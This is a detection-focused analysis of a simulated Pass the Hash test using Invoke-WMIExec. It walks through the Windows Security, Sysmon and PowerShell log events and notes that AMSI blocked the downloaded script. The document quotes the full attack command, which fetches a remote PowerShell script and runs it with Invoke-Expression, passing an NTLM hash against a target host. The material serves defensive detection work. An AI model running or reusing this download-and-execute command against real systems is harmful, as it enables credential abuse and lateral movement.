# T1550.002-3: Pass the Hash — Invoke-WMIExec Pass the Hash

## Technique Context

Pass the Hash (T1550.002) enables authentication using captured NTLM hashes. Invoke-WMIExec is a pure-PowerShell implementation from Kevin Robertson's Invoke-TheHash toolkit that authenticates over WMI without requiring any native binaries, making it a living-off-the-land variant of Pass the Hash. The script is fetched at runtime from GitHub and executed via `Invoke-Expression`, a classic fileless execution pattern.

## What This Dataset Contains

The attack command is logged in full in both Security 4688 and Sysmon EID 1:

> `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` `IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname}`

The PowerShell script block logging (EID 4104) captures this exact command twice (the outer `& {...}` wrapper and the inner block), providing redundant visibility into the full attack intent. A Sysmon EID 22 DNS query for `raw.githubusercontent.com` (resolving to `185.199.111.133`) confirms the download was attempted. A PowerShell 4100 error event records AMSI blocking the downloaded content:

> `This script contains malicious content and has been blocked by your antivirus software.`
> `Fully Qualified Error ID = ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand`

This confirms the WMIExec script was downloaded but blocked by AMSI when `IEX` attempted to execute it. The Sysmon EID 1 process creation for the powershell.exe child process is tagged `technique_id=T1059.001`. The EID 22 DNS query is tagged with no specific technique rule, occurring with `<unknown process>` as the image — a known artifact of how Sysmon resolves DNS queries in some configurations.

Sysmon EID 10 shows two ProcessAccess events from the parent PowerShell process opening the child with `GrantedAccess: 0x1FFFFF`. The full Sysmon dataset includes 46 events: 34 EID 7 image-load events for the two PowerShell processes (.NET CLR, Defender AMSI DLLs), 4 EID 17 named pipe creates, 3 EID 11 file creations (PowerShell profile data), 2 EID 1 process creates, 2 EID 10 process access events, and 1 EID 22 DNS query.

## What This Dataset Does Not Contain (and Why)

There is no successful WMI authentication, no remote command execution, and no lateral movement. AMSI blocked the Invoke-WMIExec script content before the PowerShell `IEX` command completed. No NTLM authentication events (4624/4648) appear in the Security log because the WMI connection was never established. There are no Sysmon network connection events to the target because the attack was stopped at the scripting layer before any WMI protocol traffic was sent.

## Assessment

This dataset represents the most detection-rich variant in the T1550.002 series. The combination of a full command line with the GitHub raw URL, the NTLM hash, and the target in the powershell.exe invocation, plus script block logging capturing the complete IEX payload, plus the DNS query for the download source, plus the explicit AMSI block error in PowerShell event 4100 — all constitute a layered, high-confidence evidence chain. AMSI's block error message names the exact offense, making this dataset ideal for testing detections against fileless Pass the Hash via downloaded PowerShell.

## Detection Opportunities Present in This Data

- **PowerShell 4104 script block**: The complete `IEX (IWR '...' ); Invoke-WMIExec ... -Hash <hash>` command is logged verbatim. The GitHub URL pointing to a specific commit of Invoke-TheHash is a strong indicator.
- **PowerShell 4100 AMSI block**: `ScriptContainedMaliciousContent` with `InvokeExpressionCommand` is an explicit defender-generated alert recorded in the PowerShell operational log.
- **Sysmon EID 22 DNS query** for `raw.githubusercontent.com` from `powershell.exe`: downloading script content from GitHub raw at runtime is suspicious in enterprise environments.
- **Security 4688 / Sysmon EID 1 command line**: The full invocation syntax is captured in the process creation record with the NTLM hash visible in the command arguments.
- **`[Net.ServicePointManager]::SecurityProtocol = Tls12` pattern**: This TLS coercion idiom commonly precedes malicious PowerShell downloads and is detectable in script block logs.
